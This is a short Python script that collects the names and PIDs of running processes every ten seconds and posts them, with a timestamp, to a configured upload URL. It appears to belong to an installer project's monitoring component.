import os
import time
import requests
import platform
import psutil

import sys
sys.path.insert(0, '/Users/apple/Desktop/pkg_installer/exe-and-dmg-installer')
from utils.extractzip import extract_zip
from utils.const import SERVERURL  ,monitorprocesses



UPLOAD_URL = monitorprocesses[0]["uploadurl"]  # Update with your server's URL
INTERVAL = 10  # Interval in seconds

def get_system_time():
    return time.strftime('%Y-%m-%d %H:%M:%S', time.localtime())

def get_system_info():
    processes = []
    for proc in psutil.process_iter(['pid', 'name']):
      processes.append(proc.info)

    print("Running Processes:")


    return {

       "processes": processes,
       "time":get_system_time()

        }

def send_data(data):
    print(f"Data: {data}")
    try:
        response = requests.post(UPLOAD_URL, json={**data})
        response.raise_for_status()
        print(f"Data sent successfully: {data}")
    except requests.exceptions.RequestException as e:
        print(f"Failed to send data: {e}")

def main():
    while True:
        system_info = get_system_info()
        send_data(system_info)
        time.sleep(INTERVAL)

if __name__ == '__main__':
    main()
